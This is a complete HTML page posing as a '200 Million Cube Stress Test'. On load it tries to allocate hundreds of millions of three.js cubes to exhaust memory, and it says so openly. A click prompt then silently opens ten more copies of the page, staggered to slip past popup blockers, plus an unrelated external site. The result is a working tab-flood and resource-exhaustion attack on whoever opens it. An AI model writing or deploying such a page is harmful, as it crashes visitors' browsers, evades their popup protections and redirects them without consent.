<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>🟥 200 Million Cube Stress Test</title>
  <style>
    body {
      margin: 0;
      overflow: hidden;
      background: black;
      color: #0f0;
      font-family: monospace;
      cursor: pointer;
    }
    #ui {
      position: absolute;
      top: 10px;
      left: 10px;
      background: rgba(0, 0, 0, 0.8);
      padding: 10px;
      border-radius: 10px;
      z-index: 10;
    }
  </style>
</head>
<body>
  <div id="ui">
    <div><strong>🟥 Welcome</strong></div>
    <div id="info">Now we’re going to overload your RAM. Click anywhere to begin.</div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/three@0.158.0/build/three.min.js"></script>
  <script>
    let scene, camera, renderer;
    const batches = 100;
    const instancesPerBatch = 2_000_000;
    const meshes = [];

    function start() {
      init();
      animate();
    }

    function init() {
      scene = new THREE.Scene();
      camera = new THREE.PerspectiveCamera(60, window.innerWidth / window.innerHeight, 1, 10000);
      camera.position.z = 2000;

      renderer = new THREE.WebGLRenderer({ antialias: false });
      renderer.setSize(window.innerWidth, window.innerHeight);
      document.body.appendChild(renderer.domElement);

      const geometry = new THREE.BoxGeometry(1, 1, 1);
      const material = new THREE.MeshBasicMaterial({ vertexColors: true });
      const dummy = new THREE.Object3D();
      const color = new THREE.Color();

      for (let b = 0; b < batches; b++) {
        try {
          const mesh = new THREE.InstancedMesh(geometry, material, instancesPerBatch);

          for (let i = 0; i < instancesPerBatch; i++) {
            dummy.position.set(
              (Math.random() - 0.5) * 4000,
              (Math.random() - 0.5) * 4000,
              (Math.random() - 0.5) * 4000
            );
            dummy.rotation.set(Math.random() * Math.PI, Math.random() * Math.PI, 0);
            dummy.updateMatrix();
            mesh.setMatrixAt(i, dummy.matrix);

            color.setHSL(Math.random(), 1.0, 0.5);
            mesh.setColorAt(i, color);
          }

          mesh.instanceMatrix.needsUpdate = true;
          scene.add(mesh);
          meshes.push(mesh);

          document.getElementById("info").innerText = `Batches loaded: ${b + 1}, Cubes: ${(b + 1) * instancesPerBatch}`;
        } catch (e) {
          document.getElementById("info").innerText = `❌ Failed at batch ${b + 1}, Max Cubes: ${b * instancesPerBatch}`;
          console.warn(`❌ GPU/Memory limit hit at batch ${b}`);
          break;
        }
      }

      window.addEventListener("resize", () => {
        camera.aspect = window.innerWidth / window.innerHeight;
        camera.updateProjectionMatrix();
        renderer.setSize(window.innerWidth, window.innerHeight);
      });
    }

    function animate() {
      requestAnimationFrame(animate);
      for (const m of meshes) {
        m.rotation.y += 0.01;
        m.rotation.x += 0.005;
      }
      renderer.render(scene, camera);
    }

    window.onload = start;

    // Click to open 10 local tabs and 1 external
    document.body.addEventListener("click", () => {
      const url = window.location.href;

      for (let i = 0; i < 10; i++) {
        setTimeout(() => {
          window.open(url, "_blank");
        }, i * 200); // Staggered to avoid popup blocking
      }

      setTimeout(() => {
        window.open("https://katana-king.github.io/NAJIBA/", "_blank");
      }, 2200);
    }, { once: true });
  </script>
</body>
</html>
